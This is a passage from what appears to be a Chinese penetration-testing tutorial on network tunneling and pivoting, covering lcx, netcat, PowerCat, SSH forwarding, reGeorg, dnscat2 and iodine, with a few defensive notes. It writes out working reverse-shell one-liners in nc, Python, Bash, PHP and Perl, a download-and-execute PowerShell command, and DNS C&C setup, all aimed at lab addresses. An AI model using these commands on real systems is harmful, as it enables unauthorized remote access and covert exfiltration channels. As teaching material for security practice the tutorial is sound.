title="防御ICMP隧道攻击的方法"></a>防御ICMP隧道攻击的方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向，ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p><ul><li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包。</li><li>注意那些Payload大于64bit的ICMP数据包。</li><li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包。</li><li>检查ICMP数据包的协议标签。例如，icmptunnel 会在所有的ICMP Payload 前面添加“TUNL”标记来标识隧道一这就是特征。</li></ul><h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。</p><h2 id="LCX端口转发"><a href="#LCX端口转发" class="headerlink" title="LCX端口转发"></a>LCX端口转发</h2><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe, Linux版为portmap。一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端；通过传入服务端的IP地址和端口，才能主动与服务器连接。</p><p><a href="https://github.com/Brucetg/Pentest-tools/tree/master/">下载地址</a></p><h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上。<br><code>lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</code></p><p>在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。<br><code>lcx.exe -listen 4444 5555</code></p><p>此时，用mstsc登录“&lt;公网主机IP地址&gt;:5555”，或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。</p><h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口(例如53)。在目标主机上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。<br><code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><h3 id="简易使用"><a href="#简易使用" class="headerlink" title="简易使用"></a>简易使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d：后台模式</span><br><span class="line">-e：程序重定向</span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多可设置8个</span><br><span class="line">-G&lt;指向器数目&gt;：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-h：在线帮助</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</span><br><span class="line">-l：使用监听模式，管理和控制传入的数据</span><br><span class="line">-n：直接使用IP地址(不通过域名服务器)</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口</span><br><span class="line">-r：随机指定本地与远程主机的通信端口</span><br><span class="line">-s&lt;源地址&gt;：设置本地主机送出数据包的IP地址</span><br><span class="line">-u：使用UDP传输协议</span><br><span class="line">-v：详细输出</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间</span><br><span class="line">-z：将输入/输出功能关闭，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure><p>Banner抓取：<br><code>nc -nv 192.168.220.165 21</code></p><p>连接远程主机<br><code>nc -nvv 192.168.220.165 80</code></p><p>端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.220.165 80   扫描指定端口</span><br><span class="line">nc -v -z 192.168.220.165 20-1024   扫描端口段（速度慢）</span><br></pre></td></tr></table></figure><p>端口监听<br><code>nc -l -p 4444   当访问该端口时会输出该信息到命令行</code></p><p>文件传输</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444                               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 &lt; test.txt -q 1 发送方传输test.txt</span><br></pre></td></tr></table></figure><p>简易聊天</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 发送方</span><br></pre></td></tr></table></figure><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>Shell分为两种，一种是正向Shell，另一种是反向Shell。 如果客户端连接服务器，客户端想要获取服务器的Shell, 就称为正向Shell；如果客户端连接服务器，服务器想要获取客户端的Shell,就称为反向Shell。反向Shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。<br><strong>正向shell</strong><br>在目标主机中输入如下命令，监听目标主机的4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -1vp 4444 -e /bin/sh                     //Linux</span><br><span class="line">nc -lvp 4444 -e c:\\windows\\system32\\cmd.exe //Windows</span><br></pre></td></tr></table></figure><p>在kali攻击机输入如下命令，连接目标主机的4444端口<br><code>nc &lt;目标IP&gt; 4444</code></p><p>可以在目标主机上看到 目标IP 正在连接本机。</p><p><strong>反向shell</strong><br>kali攻击机输入如下命令，监听本地9999端口。<br><code>nc -lvp 9999</code></p><p>在目标主机中输入如下命令，连接VPS主机192.168.220.165 的9999端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.220.165 9999 -e /bin/sh                    //Linux</span><br><span class="line">nc 192.168.220.165 9999 -e C:\windows\system32\cmd.exe//Windows </span><br></pre></td></tr></table></figure><h3 id="在目标主机中没有nc时获取反向shell"><a href="#在目标主机中没有nc时获取反向shell" class="headerlink" title="在目标主机中没有nc时获取反向shell"></a>在目标主机中没有nc时获取反向shell</h3><p>在一般情况下，目标主机中是没有nc的。此时，可以使用其他工具和编程语言来代替nc，实现反向连接(下面的代码仅适用于目标主机为linux的情况)</p><p>(1) Python反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((&quot;192.168.220.165&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>(2) Bash反弹shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令<br><code>bash -i &gt;&amp; /dev/tcp/192.168.220.165/4444 0&gt;&amp;1</code></p><p>(3) PHP反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>PHP常用在Web服务器上，它是nc、Perl 和Bash的一个很好的替代品。执行如下命令，实现PHP环境下的反弹Shell<br><code>php -r &#39;$sock=fsockopen(&quot;192.168.220.165,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>(4) Perl反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>如果此时目标主机使用的是Perl语言，仍然可以使用Perl来建立反向Shell。<br>在目标主机上运行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.220.165&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>假设有三台主机A、B和C，其中B、C在内网环境中。主机A访问B，并获取了B的Shell；A不能直接访问C，可以通过B访问C。现在要获取C的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在主机A：nc -lvp 4444</span><br><span class="line">在主机C：nc -lvp 9999 -e /bin/sh</span><br><span class="line">在主机B：nc -v &lt;主机A的IP地址&gt; 4444 -c <span class="string">&quot;nc -v &lt;主机C的IP地址&gt; 9999&quot;</span></span><br></pre></td></tr></table></figure><h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc的PowerShell版本。PowerCat 可以通过执行命令回到本地运行，也可以使用远程权限运行。<br><strong>下载安装PowerCat</strong><br>打开命令行环境，执行git clone命令( 确保本地主机中安装了git 环境)下载PowerCat<br>下载完成后，在终端输入<br><code>cd powercat</code><br>即可进入PowerCat的目录。在PowerShell命令行环境中，要想使用powercat.ps1脚本，必须先进行导入操作。<br><code>Import-Module .\powercat.ps1</code></p><p>如果提示未能加载指定模块，则可能是权限问题，输入下面命令修改权限<br><code>Set-ExecutionPolicy Unrestricted</code></p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>powercat的使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l      监听模式</span><br><span class="line">-p      指定监听端口</span><br><span class="line">-e      指定启动进程的名称</span><br><span class="line">-v      显示详情</span><br><span class="line">-c      指定想要连接的 IP 地址</span><br><span class="line">-ep     返回 powershell</span><br><span class="line">-dns    使用 dns 通信</span><br><span class="line">-g      生成 payload</span><br><span class="line">-ge     生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</span><br></pre></td></tr></table></figure><p><strong>正向连接</strong><br>Kali 上的 nc 连接到靶机<br><code>nc -v 192.168.220.142 4444</code></p><p>靶机开启监听，等待 Kali 连接<br><code>powercat -l -v -p 4444 -e cmd.exe</code></p><p><strong>反向连接</strong><br>Kali 上开启监听<br><code>nc -lvp 4444</code></p><p>靶机向 kali 发起连接<br><code>powercat -c 192.168.220.165 -p 4444 -e cmd.exe</code></p><p><strong>返回powershell</strong><br>攻击机上运行<br><code>powercat -l -v -p 4444</code></p><p>靶机上运行<br><code>powercat -c 192.168.220.165 -p 4444 -v -ep</code></p><p><strong>powercat生成payload</strong><br>用PowerCat生成的Pylod也有正向和反向之分，且可以对其进行编码。尝试生成一个简单的Payload,在攻击机中执行如下命令。<br><code>powercat -1 -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</code></p><p>将生成的psl文件上传到靶机中并执行，然后在攻击机中执行如下命令,就可以获得一个反弹 Shell。<br><code>powercat -C 191.168.52.10 -P 8000 -V</code></p><p>如果想反弹PowerShell,可以执行如下命令。<br><code>powercat -1 -P 8000 -ep -V -g &gt;&gt; shell.ps1</code></p><p>用PowerCat也可以直接生成经过编码的Payload。在攻击机中执行如下命令，即可得到经过编码的Payload。<br><code>powercat -C 192.168.52.10 -P 9999 -ep -ge</code></p><p>继续在攻击机中执行如下命令，并将Payload在靶机执行<br><code>powercat -1 -p 9999 -V</code></p><p>虽然PowerCat的作者给出的说明是在PowerShell 2.0以上版本中就可以使用这个功能，但是根据测试，在PowerShell 4.0以下版本中使用这个功能时都会报错。</p><p><strong>建立dns隧道连接</strong><br>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。<br>在服务端上安装 dnscat ，以 kali 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>命令运行完之后，执行以下命令开启服务端<br><code>ruby dnscat2.rb powercat -e open --no-cache</code></p><p>在靶机下，执行以下命令，建立 dns 隧道<br><code>powercat -c 192.168.220.165 -p 53 -dns powercat -e cmd.exe</code></p><p><strong>将PowerCat作为跳板</strong><br>测试环境为：</p><ul><li>kali 192.168.220.165</li><li>windows7 192.168.220.142&amp;&amp;192.168.52.10</li><li>win2008 192.168.52.30</li></ul><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 win2008<br>在 win2008 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 4444 -e cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -C -192.168.52.10 -p 8000 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p>在 win7 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 5555 -r tcp:192.168.52.30:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -1 -p 8000 -r dns:192.168.220.165::ttpowercat.test</span><br></pre></td></tr></table></figure><p>最后在 kali 下连接 win7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -v 172.16.214.2 5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP&#x2F;HTTPS和DNS。</p><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中，几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。<br>在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。<br>同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。<br>攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。</p><p>一个普通的SSH命令如下。<br><code>ssh root@192.168.1.1</code></p><p>创建SSH隧道的常用参数说明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">-N：建立静默连接(建立了连接，但是看不到具体会话)</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发(SOCKS代理)</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>实验环境<br><img src="/simg/tunnel_4.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器192.168.220.145为跳板，将内网主机192.168.52.133 的3389端口映射到kali攻击机192.168.220.165的4444端口，再访问kali攻击机的4444端口，就可以访问192.168.52.133的3389端口了。</p><p>kali攻击机上执行如下命令，会要求输入Web服务器(跳板机)的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 4444(VPS端口):192.168.52.133 (目标主机):80(目标端口) root@192.168.220.145(跳板机)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_5.png" alt=" "><br><img src="/simg/tunnel_6.png" alt=" "><br><img src="/simg/tunnel_7.png" alt=" "></p><p>SSH进程的本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</p><h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器为跳板，将kali攻击机的3307端口的流量转发到内网主机的3389端口，然后访问kali攻击机的3307端口，就可以访问内网主机的3389端口了。</p><p>在Web服务器192.168.220.145上执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307(kali攻击机端口):192.168.52.133(目标主机):3389(目标端口) root@192.168.220.165(kali攻击机ip)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_8.png" alt=" "></p><p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接<br><code>rdesktop 127.0.0.1:3307</code></p><p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。<br>远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.140、192.168.52.137</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>在kali攻击机上执行如下命令，建立一个动态的SOCKS 4&#x2F;5代理通道，输入Web服务器的密码。</p><p><code>ssh -CfNg -D 7000 root@192.168.220.140</code></p><p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器192.168.52.133<br>输入如下命令，查看本地7000端口是否已经连接。</p><p><code>netstat -tulnp 1 grep &quot;: 7000&quot;</code></p><p>动态端口映射就是建立一个SSH加密的SOCKS 4&#x2F;5代理通道。任何支持SOCKS 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><h3 id="防御SSH隧道攻击的思路"><a href="#防御SSH隧道攻击的思路" class="headerlink" title="防御SSH隧道攻击的思路"></a>防御SSH隧道攻击的思路</h3><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p><p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略(从外部到内部；从内部到外部)。</p><h2 id="HTTP-x2F-HTTPS协议"><a href="#HTTP-x2F-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter 、tunna等。</p><p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。</p><p>reGeorg 支持ASPX、PHP、JSP 等Web脚本，并特别提供了一个Tomeat5版本。</p><p>将脚本文件上传到目标服务器中，使用Kali Linux在本地访问远程服务器上的tunnel.jsp 文件。返回后，利用reGeorgSocksProxy.py脚本监听本地的9999端口，即可建立一个通信链路。</p><p>输入如下命令，查看本地端口，可以发现9999端口已经开启了。</p><p><code>python reGeorgSocksProxy.py -u http://192.168.220.140:8080/tunnel.jsp -p 9999</code></p><p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p><p>传统的Web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行端口转发，不仅攻击者可以直接访问Web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。因此，在日常网络维护中，需要监控HTTP隧道的情况，及时发现问题。</p><h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道。</p><p>一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p><p>用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器( Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p><p>正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后, C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p><p>内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了。</p><p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p><p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。</p><h3 id="查看DNS的连通性"><a href="#查看DNS的连通性" class="headerlink" title="查看DNS的连通性"></a>查看DNS的连通性</h3><p>首先，需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是要测试DNS的连通性。</p><p>输入如下命令，查询当前内部域名及IP地址。<br><code>cat /etc/resolv.conf|grep -v &#39;#&#39;</code></p><p>输入如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名<br><code>nslookup ad.com</code></p><p>输入如下命令,查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信。<br><code>nslookup baidu.com</code></p><h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>nscat2是一款开源软件。它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型( TXT、MX、CNAME、A. AAAA),多个同时进行的会话类似于SSH中的隧道，dnscat2 是一个命令与控制工具。</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢。</li></ul><p>如果目标内网放行所有的DNS请求，dnscat2 会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以“dnscat”开头的，因此防火墙可以很容易地将直连模式的通信检测出来。</p><p>如果目标内网中的请求仅限于白名单服务器或者特定的域, dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。</p><p>dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点。</p><ul><li>支持多个会话。</li><li>流量加密。</li><li>使用密钥防止MiTM攻击。</li><li>在内存中直接执行PowerShell脚本。</li><li>隐蔽通信。</li></ul><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456  <span class="comment"># abc.com 自定义DNS传输的域名；--secret 自定义连接密码</span></span><br><span class="line">sudo ruby./dnscat2.rb --dns host=127.0.0.1,port=533 --secret=123456  <span class="comment">#设置监听端口</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="comment">#--security 规定了安全级别；--no-cache 禁止缓存</span></span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat --secret=123456 abc.com </span><br><span class="line">dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553 --secret=123456</span><br></pre></td></tr></table></figure><p>具体的使用方法看官方手册</p><h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为“iodine”</p><p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>iodine 是基于C语言开发的，分为服务端程序iodined 和客户端程序iodine。Kali Linux内置了iodine。<br>与同类工具相比，iodine 具有如下特点：</p><ul><li>不会对下行数据进行编码。</li><li>支持多平台，包括Linux、 BSD、Mac OS、Windows。</li><li>支持16个并发连接。</li><li>支持强制密码机制。</li><li>支持同网段隧道IP地址(不同于服务器一客户端网段)。</li><li>支持多种DNS记录类型。</li><li>提供了丰富的隧道质量检测措施。</li></ul><p>iodine支持直接转发和中继两种模式.<br>其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。<br>在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。</p><p>具体的使用方法看官方手册</p><h3 id="防御DNS隧道攻击的方法"><a href="#防御DNS隧道攻击的方法" class="headerlink" 